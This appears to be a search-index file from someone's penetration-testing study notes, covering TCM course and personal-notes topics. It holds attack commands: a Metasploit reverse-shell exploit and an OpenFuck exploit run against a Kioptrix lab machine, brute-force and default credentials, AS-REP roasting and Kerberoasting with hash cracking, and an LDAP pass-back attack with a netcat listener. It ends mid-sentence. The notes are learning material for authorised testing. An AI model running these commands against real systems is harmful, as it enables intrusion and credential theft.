    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


    

    

    index.add(
            {
                id:  0 ,
                href: "\/docs\/hdks\/reconnaissance\/",
                title: "Reconnaissance",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  1 ,
                href: "\/docs\/tcm-peh\/exploitation\/kioptrix\/",
                title: "Kioptrix",
                description: " Metasploit link use exploit/linux/samba/trans2open set rhosts 192.168.215.112 set lhost 192.168.215.151 run But this wont work.\nIn order this to work, I have to change the payload to stageless payload.\nset payload linux/x86/shell_reverse_tcp run Manual Exploitation link git clone https://github.com/heltonWernik/OpenLuck.git cd OpenLuck gcc -o OpenFuck OpenFuck.c -lcrypto ./OpenFuck 0x6b 192.168.215.112 443 -c 40 Reference:\nhttps://github.com/heltonWernik/OpenLuck.git ",
                content: " Metasploit link use exploit/linux/samba/trans2open set rhosts 192.168.215.112 set lhost 192.168.215.151 run But this wont work.\nIn order this to work, I have to change the payload to stageless payload.\nset payload linux/x86/shell_reverse_tcp run Manual Exploitation link git clone https://github.com/heltonWernik/OpenLuck.git cd OpenLuck gcc -o OpenFuck OpenFuck.c -lcrypto ./OpenFuck 0x6b 192.168.215.112 443 -c 40 Reference:\nhttps://github.com/heltonWernik/OpenLuck.git "
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/docs\/tcm-peh\/enumeration\/kioptrix\/",
                title: "Kioptrix",
                description: "Find the Target IP linkarp-scan link arp-scan -l In this case, my target IP address is 192.168.215.112.\nping linkLogin to the target machine with john:TwoCows2 credentials. (cheat)\nssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc john@192.168.215.112 Then ping some random IP to find the source IP which is the target IP.\nping 8.8.8.8 netdiscover link sudo netdiscover -r 192.168.215.0/24 Enumeration linkKioptrix walkthrough will not be added here as it is an very easy box and I can find so many detailed walkthroughs from the internet if want.",
                content: " Find the Target IP linkarp-scan link arp-scan -l In this case, my target IP address is 192.168.215.112.\nping linkLogin to the target machine with john:TwoCows2 credentials. (cheat)\nssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc john@192.168.215.112 Then ping some random IP to find the source IP which is the target IP.\nping 8.8.8.8 netdiscover link sudo netdiscover -r 192.168.215.0/24 Enumeration linkKioptrix walkthrough will not be added here as it is an very easy box and I can find so many detailed walkthroughs from the internet if want.\nTools used:\nnmap nikto ffuf nessus Reference:\nhttps://tcm-sec.com/kioptrix "
            }
        );
    index.add(
            {
                id:  3 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/identifying\/",
                title: "Identifying My Target",
                description: "Identifing Our Target linkNeed to identify Whats within the SCOPE and Whats not.\nExample: https://bugcrowd.com/tesla",
                content: " Identifing Our Target linkNeed to identify Whats within the SCOPE and Whats not.\nExample: https://bugcrowd.com/tesla\n"
            }
        );
    index.add(
            {
                id:  4 ,
                href: "\/docs\/htb\/",
                title: "HTB",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  5 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/",
                title: "Reconnaissance",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  6 ,
                href: "\/docs\/hdks\/linux\/",
                title: "Linux",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  7 ,
                href: "\/docs\/tcm-peh\/",
                title: "TCM-PEH",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  8 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/email_discovery\/",
                title: "Email Hunting",
                description: "Discovering Email Addresses linkHunter.io linkhunter.io also can identify the pattern of the email address.\nIn this case it is {f}{last}@tesla.com which means {fist name initial}{last name}@tesla.com\nIf I had an account created, I can see alot more information about the email addresses of the target.\nPhonebook.cz link Clearbit linkThis is also a fantastic Chrome Extension that allows me to discover email addresses with some other cool details that other tools did not find.",
                content: " Discovering Email Addresses linkHunter.io linkhunter.io also can identify the pattern of the email address.\nIn this case it is {f}{last}@tesla.com which means {fist name initial}{last name}@tesla.com\nIf I had an account created, I can see alot more information about the email addresses of the target.\nPhonebook.cz link Clearbit linkThis is also a fantastic Chrome Extension that allows me to discover email addresses with some other cool details that other tools did not find.\nEmailHippo linkWith this tool, I can verify if the email addresses are valid or not.\nEmail Checker linkLike EmailHippo, this is also can be used to velidate email addresses of my target.\nGoogle (Forget Password) linkThere is a way to link email addresses with Google Forget Password option.\nStep 1:\nStep 2: Enter the email address.\nStep 3: [Will be added soon]\nReference:\nhttps://hunter.io/ https://phonebook.cz/ https://clearbit.com/resources/tools/connect https://tools.emailhippo.com/ https://email-checker.net/ "
            }
        );
    index.add(
            {
                id:  9 ,
                href: "\/docs\/tcm-peh\/enumeration\/",
                title: "Scanning \u0026 Enumeration",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  10 ,
                href: "\/docs\/hdks\/windows\/",
                title: "Windows",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  11 ,
                href: "\/docs\/hdks\/",
                title: "Notes [HDKS]",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  12 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/credentials_hunting\/",
                title: "Credential Hunting",
                description: " Dehashed linkThis is a website which costs money but definitely worth it.\nWith this I can browse through all the breached databases and find potential credentials in many ways.\nReference:\nhttps://dehashed.com/ ",
                content: " Dehashed linkThis is a website which costs money but definitely worth it.\nWith this I can browse through all the breached databases and find potential credentials in many ways.\nReference:\nhttps://dehashed.com/ "
            }
        );
    index.add(
            {
                id:  13 ,
                href: "\/docs\/tcm-peh\/exploitation\/",
                title: "Exploitation",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  14 ,
                href: "\/docs\/hdks\/web\/",
                title: "Web",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  15 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/subdomain_hunting\/",
                title: "Subdomain Hunting",
                description: " Sublist3r link sublist3r.py -d tesla.com -o sub.tesla.com.log crt.sh linkWith this website, I can find subdomains of a domain by Certificate Fingerprinting.\nhttprobe linkI can check if all the subdomains that I found ealier are up or not with this tool.\ncat /opt/Sublist3r/sub.tesla.com.log | httprobe Reference:\nhttps://github.com/aboul3la/Sublist3r https://crt.sh/ https://github.com/tomnomnom/httprobe ",
                content: " Sublist3r link sublist3r.py -d tesla.com -o sub.tesla.com.log crt.sh linkWith this website, I can find subdomains of a domain by Certificate Fingerprinting.\nhttprobe linkI can check if all the subdomains that I found ealier are up or not with this tool.\ncat /opt/Sublist3r/sub.tesla.com.log | httprobe Reference:\nhttps://github.com/aboul3la/Sublist3r https://crt.sh/ https://github.com/tomnomnom/httprobe "
            }
        );
    index.add(
            {
                id:  16 ,
                href: "\/docs\/tcm-peh\/persistence\/",
                title: "Persistence",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  17 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/web_technologies\/",
                title: "Web Technologies",
                description: "BuiltWith linkWith this website, I can find what technologies does the target websited utilizes.\nWappalyzer linkSimilar to BuiltWith.com, with this website I can find what technologies does the target websited utilizes.\nWappalyzer also has browser extensions that comes in handy when it comes to time management.\nWappalyzer also considers as active scanning tool according to how the tool gather information from the website\nWhatweb link whatweb https://book.hacktricks.xyz Reference:\nhttps://builtwith.com/ https://www.",
                content: " BuiltWith linkWith this website, I can find what technologies does the target websited utilizes.\nWappalyzer linkSimilar to BuiltWith.com, with this website I can find what technologies does the target websited utilizes.\nWappalyzer also has browser extensions that comes in handy when it comes to time management.\nWappalyzer also considers as active scanning tool according to how the tool gather information from the website\nWhatweb link whatweb https://book.hacktricks.xyz Reference:\nhttps://builtwith.com/ https://www.wappalyzer.com/ "
            }
        );
    index.add(
            {
                id:  18 ,
                href: "\/docs\/tcm-peh\/cleanup\/",
                title: "Covering Tracks",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  19 ,
                href: "\/docs\/tcm-peh\/exploit_development\/",
                title: "Exploit Development",
                description: " Reference:\nhttps://thegreycorner.com/vulnserver.html ",
                content: " Reference:\nhttps://thegreycorner.com/vulnserver.html "
            }
        );
    index.add(
            {
                id:  20 ,
                href: "\/docs\/tcm-peh\/reconnaissance\/google_fu\/",
                title: "Google Fu",
                description: " Filter Domain link site:tesla.com Exclude Keywords link site:tesla.com -shop Filter Filetypes link site:tesla.com filetype:pdf Filter Keywords Within the URL link site:tesla.com inurl:php?id= This way I can find potential SQL injectable websites as well.\nReference:\nhttps://ahrefs.com/blog/google-advanced-search-operators/ ",
                content: " Filter Domain link site:tesla.com Exclude Keywords link site:tesla.com -shop Filter Filetypes link site:tesla.com filetype:pdf Filter Keywords Within the URL link site:tesla.com inurl:php?id= This way I can find potential SQL injectable websites as well.\nReference:\nhttps://ahrefs.com/blog/google-advanced-search-operators/ "
            }
        );
    index.add(
            {
                id:  21 ,
                href: "\/docs\/hdks\/web\/tool\/",
                title: "Tool",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  22 ,
                href: "\/docs\/hdks\/web\/template-engine\/",
                title: "Template Engine",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  23 ,
                href: "\/docs\/hdks\/web\/security-risk\/",
                title: "Security Risk",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  24 ,
                href: "\/docs\/hdks\/web\/microsoft\/",
                title: "Microsoft",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  25 ,
                href: "\/docs\/hdks\/web\/method\/",
                title: "Method",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  26 ,
                href: "\/docs\/hdks\/web\/framework\/",
                title: "Framework",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  27 ,
                href: "\/docs\/hdks\/web\/elasticsearch\/",
                title: "Elasticsearch",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  28 ,
                href: "\/docs\/hdks\/web\/cookie\/",
                title: "Cookie",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  29 ,
                href: "\/docs\/hdks\/web\/cms\/",
                title: "Cms",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  30 ,
                href: "\/docs\/hdks\/web\/api\/",
                title: "Api",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  31 ,
                href: "\/docs\/hdks\/windows\/wsl\/",
                title: "Wsl",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  32 ,
                href: "\/docs\/hdks\/windows\/technique\/",
                title: "Technique",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  33 ,
                href: "\/docs\/hdks\/windows\/service\/",
                title: "Service",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  34 ,
                href: "\/docs\/hdks\/windows\/protocol\/",
                title: "Protocol",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  35 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/",
                title: "Privilege Escalation",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  36 ,
                href: "\/docs\/hdks\/windows\/powershell\/",
                title: "Powershell",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  37 ,
                href: "\/docs\/hdks\/windows\/post-exploitation\/",
                title: "Post Exploitation",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  38 ,
                href: "\/docs\/hdks\/windows\/forensics\/",
                title: "Forensics",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  39 ,
                href: "\/docs\/hdks\/windows\/active-directory\/",
                title: "Active Directory",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  40 ,
                href: "\/docs\/hdks\/linux\/protocol\/",
                title: "Protocol",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  41 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/",
                title: "Privilege Escalation",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  42 ,
                href: "\/docs\/hdks\/linux\/post-exploitation\/",
                title: "Post Exploitation",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  43 ,
                href: "\/docs\/hdks\/linux\/management\/",
                title: "Management",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  44 ,
                href: "\/docs\/hdks\/linux\/container\/",
                title: "Container",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  45 ,
                href: "\/docs\/hdks\/linux\/backup\/",
                title: "Backup",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  46 ,
                href: "\/docs\/hdks\/linux\/archive\/",
                title: "Archive",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  47 ,
                href: "\/docs\/",
                title: "Docs",
                description: "",
                content: ""
            }
        );
    index.add(
            {
                id:  48 ,
                href: "\/docs\/hdks\/web\/elasticsearch\/elasticsearch-pentesting\/",
                title: "Elasticsearch Pentesting",
                description: "It is a search engine based on the Lucene library. Default ports are 9200, 9300.",
                content: "Default Credentials link admin:elasticadmin elastic:changeme Brute Force Credentials linkCrack the Authorization header in the web page.\nhydra -L usernames.txt -P passwords.txt -s 9200 http-get / Common Directories link /_cat/ /_cat/indices /_cluster/ /_nodes/ /_remote/ /_security /_search?q=username /_search?q=password /_security/role /_security/user /_xpack/security/user/ "
            }
        );
    index.add(
            {
                id:  49 ,
                href: "\/docs\/hdks\/web\/cms\/joomla-cms-pentesting\/",
                title: "Joomla CMS Pentesting",
                description: "Joomla is a content managemen system (CMS).",
                content: "Scan link joomscan -u https://example.com Common Directories link /administrator/ /administrator/manifests/files/joomla.xml /cache/ /components/ /configuration.php /htaccess.txt /includes/ /index.php /joomla.xml /language/en-GB/en-GB.xml /libraries/ /LICENSE.txt /logs/ /media/ /modules/ /plugins/ /README.txt /templates/ /tmp/ Default Credentials linkThe default username is admin and no password.\n"
            }
        );
    index.add(
            {
                id:  50 ,
                href: "\/docs\/hdks\/web\/method\/web-content-discovery\/",
                title: "Web Content Discovery",
                description: "If we want to find hidden directories or files, we can enumerate them manually/automatically.",
                content: "Manual Discovery link # Settings files /robots.txt /security.txt /.well-known/security.txt /.well-known/apple-app-site-association /.well-known/assetlinks.json /sitemap.xml /sitemaps.xml # JavaScript files /main.js /script.js /js/jquery.min.js /js/main.js /js/script.js # CGI scripts /cgi-bin/example.cgi # Wave dashes /~files/ /~hidden/ # PHP files /index.php /config.php /403.php /404.php # Python files /main.py /module.py /module/__init__.py /modules/__init__.py __init__.py config.ini project.wsgi # Archives /example.zip /backup.zip /backups.zip # Backup files /example.bak /example.jpg.bak /images/example.jpg.bak # Directories /admin/ /blog/ # Sensitive information /.env # GitHub /README.md /.git /.github /.gitignore # Apache Tomcat /manager # ASP.NET /example.asp /example.aspx # If you know the users manage the website, try the usernames /admin /administrator /john /michael # API endpoints /api/login /api/signin /api/user /api/user/1 /api/users /api/v1/ /api/v2/ # If we have the secret keyword found when investigating, we can attempt to access following contents. / /.html /.txt /.php /.py /?=test # We might be able to access directories by using keywords we found. / / / / /?=test Wordlists linkCeWL linkCeWL is a curstom wordlist generator from websites.\n# -d: Depth (default: 2) # -w: Write the output to the file cewl -d 3 https://example.com/ -w output.txt SecLists linkSecLists is a collection of multiple types of lists.\nThey are usually located in /usr/share/seclsits/ in Linux.\nless /usr/share/seclists/Discovery/Web-Content/common.txt Automation linkFfuf linkFor bug bounty programs, set the -t flag and the -p flag to decrease requests per second.\nffuf -u https://example.com/FUZZ -w wordlist.txt ffuf -u https://example.com/.FUZZ -w wordlist.txt ffuf -u https://example.com/FUZZ.txt -w wordlist.txt ffuf -u https://example.com/FUZZ.php -w wordlist.txt ffuf -u https://example.com/index.php?FUZZ=test -w wordlist.txt # POST request ffuf -u https://example.com/FUZZ -X POST -w wordlist.txt # -t: Threads e.g. 5 threads # -p: Pause N seconds per request e.g. 0.1 seconds ffuf -u http://example.com/FFUF -w wordlist.txt -t 5 -p 0.1 # Custom header (-H) ffuf -H \"Cookie: key=value\" -u https://example.com/FUZZ -w wordlist.txt # -mc: Match HTTP statuc code ffuf -u http://example.com/FUZZ -w wordlist.txt -mc 200 # 422 status code ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 422 # -ms: Match HTTP response size ffuf -u http://example.com/FUZZ -w wordlist.txt -ms 1234 ffuf -u http://example.com/FUZZ -w wordlist.txt -ms 50-300 # -fc: Filter HTTP statuc code ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 302 # -fs: Filter HTTP response size ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 1234 ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 50-300 # Extensions ffuf -u https://example.com/FUZZ -e .html,.txt,.js,.php,.py,.asp,.json -w wordlist.txt For fuzzing with numbers, we can use the following commands.\nfor i in {0..255}; do echo $i; done | ffuf -u 'http://example.com/?id=FUZZ' -w - seq 0 255 | ffuf -u 'http://example.com/?id=FUZZ' -w - Dirsearch linkDirsearch is a web path scanner.\nFor bug bounty programs, set the flag -t and max-rate to decrease requests per second.\ndirsearch -u https://example.com/ # -w: wordlist dirsearch -u https://example.com/ -w wordlist.txt # -t: number of threads # --max-rate: max requests per second dirsearch -u https://example.com/ -t 1 --max-rate=1 # -m: Method dirsearch -m POST -u https://example.com/ # Extensions dirsearch -u https://example.com -e html,txt,js,php,py,asp,json -w wordlist.txt Gobuster link gobuster dir -u https://example.com -w wordlist.txt Dirb link dirb https://example.com/ dirb https://example.com/ wordlist.txt # Custom header (-H) dirb https://example.com/ -H \"Authorization: Basic {token}\" wordlist.txt # File Extensions (-X) dirb https://example.com/ -X .txt FeroxBuster linkFeroxBuster is a recursive content discovery.\nferoxbuster -u https://vulnerable.com # Specify extensions (-x) feroxbuster -u https://vulnerable.com -x html,js,php # No recursion (-n) feroxbuster -u https://vulnerable.com -n # Custom header (-H) feroxbuster -u https://vulnerable.com -H \"Authorization: Bearer {token}\" Hakrawler linkHakrawler is a simple web crawler designed for quick discovery of endpoints and assets within a web application.\necho https://vulnerable.com | hakrawler Wfuzz link # -w: wordlist (alias for -z file,wordlist) wfuzz -w wordlist.txt https://example.com/FUZZ # -z: payload wfuzz -z file,wordlist.txt https://example.com/FUZZ Framework Detection from Favicon linkGet the information of the used framework from favicon.\ncurl https://vulnerable.com/images/favicon.ico | md5sum Then check what is the framework used in the website with the OWASP Favicon Database.\nParsing .DS_Store linkds_store_exp is a tool that parses .DS_Store file and downloads files recursively.\npip3 install ds-store python3 ds_store_exp.py https://example.com/.DS_Store "
            }
        );
    index.add(
            {
                id:  51 ,
                href: "\/docs\/hdks\/windows\/active-directory\/as-rep-roasting\/",
                title: "AS-REP Roasting",
                description: "AS-REP Roasting is a technique that retrieves password hashes that are not required Kerberos preauth in Active Directory.",
                content: "Enumeration linkLists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.\nimpacket-GetNPUsers -dc-ip example.local/ -no-pass -usersfile users.txt impacket-GetNPUsers -dc-ip example.local/ -no-pass -format hashcat # Without authenticatino netexec ldap -u users.txt -p '' --asreproast output.txt # With authentication netexec ldap -u username -p password --asreproast output.txt If we find a password hash, crack it.\njohn --format=krb5asrep --wordlist=wordlist.txt hash.txt # or hashcat -m 18200 -a 0 hash.txt wordlist.txt Also, we can use it to Pass-The-Hash attack.\n"
            }
        );
    index.add(
            {
                id:  52 ,
                href: "\/docs\/hdks\/windows\/active-directory\/kerberoasting-attack\/",
                title: "Kerberoasting Attack",
                description: "Kerberoasting is a attack technique against Kerberos with cracking passwords using a credential already gathered.",
                content: "Attack linkIf we have a password hash of a user, we might be able to find another user credential using the hash.\nimpacket-GetUserSPNs -hashes : example.local/username -outputfile hashes.txt # Without pre-authentication # -no-preauth: https://github.com/SecureAuthCorp/impacket/pull/1413 impacket-GetUserSPNs -no-preauth username -usersfile users.txt -dc-host example.local/ netexec ldap -u username -p password --kerberoasting output.txt netexec ldap -u '' -p '' --kerberoasting output.txt After finding hashes, we can crack it or use for pass-the-hash attack.\nTo crack, run the following commands:\njohn --format=krb5tgs --wordlist=wordlist.txt hash.txt # or hashcat -m 13100 -a 0 hash.txt wordlist.txt "
            }
        );
    index.add(
            {
                id:  53 ,
                href: "\/docs\/hdks\/windows\/active-directory\/ldap-pentesting\/",
                title: "LDAP (Lightweight Directory Access Protocol) Pentesting",
                description: "LDAP is a standard protocol designed to maintain and access \"directory services\" within a network. Default ports are 389 (LDAP), 636 (LDAPS), 3268 (LDAP connection to Global Catalog), 3269 (LDAP connection to Global Catalog over SSL).",
                content: "Enumeration link # Nmap nmap --script ldap-brute --script-args ldap.base='\"cn=users,dc=cqure,dc=net\"' -p 389 nmap --script ldap-search -p 389 nmap --script ldap-* -p 389 nmap --script \"ldap* and not brute\" -p 389 # NetExec # -k: Use Kerberos authentication netexec ldap -u usernames.txt -p '' -k # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION` # reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions netexec ldap -u username -p password --trusted-for-delegation Search LDAP linkBelows are defined in LDAP.\ncn - Common Name dc - Domain Component ou - Organizational Unit # -b: base dn for search ldapsearch -x -H ldap://10.0.0.1 -b \"dc=example,dc=com\" ldapsearch -x -H ldap://10.0.0.1:636 -b \"dc=example,dc=com\" # As administrator # -D: bind DN # -w: bind password ldapsearch -x -H ldap://10.0.0.1 -b \"dc=example,dc=com\" -D \"cn=admin,dc=example,dc=com\" -w password ldapsearch -x -H ldap://10.0.0.1 -b \"dc=example,dc=com\" -D \"cn=admin,dc=example,dc=com\" -W # Search sAMAccountName ldapsearch -x -H ldap://10.0.0.1 -b \"dc=example,dc=com\" -D \"workspace\\\\ldap\" -w 'password' \"(objectclass=*)\" \"sAMAccountName\" ldapsearch -x -H ldap://10.0.0.1 -b \"dc=example,dc=com\" -D \"workspace\\\\ldap\" -w 'password' \"(objectclass=*)\" \"sAMAccountName\" | grep sAMAccountName # Get information ldapsearch -x -H ldap://10.0.0.1 -b \"cn=sample,cn=Users,dc=example,dc=com\" -w 'password' \"(objectclass=*)\" -D \"example\\\\name\" Dump Active Directory Information linkIf you have the credential, you can get the Active Directory information via LDAP.\n# --no-html: Disable html output # --no-grep: Disable greppable output # -o: Output dir ldapdomaindump -u 'DOMAIN\\username' -p password --no-html --no-grep -o dumped Connect linkAD CS (Active Directory Certificate Services) link cd crackmapexec # -M: module poetry run crackmapexec ldap -d 'domain' -u 'username' -p 'password' -M adcs LAPS (Local Administrator Password Solution) link cd crackmapexec # -M: module poetry run crackmapexec ldap -u 'username' -p 'password' --kdcHost -M laps Pass-Back Attack linkAttack against the network devices such as printers.\nFor example, access http://printer.sub.example.com/settings.aspx\nOpen a listener for connecting back to your local machine.\nnc -vp 1389 In your browser, test LDAP settings where you input username and password.\nHost Rogue LDAP Server linkIf we cannot connect back in local machine by netcat, we need to create a rogue LDAP 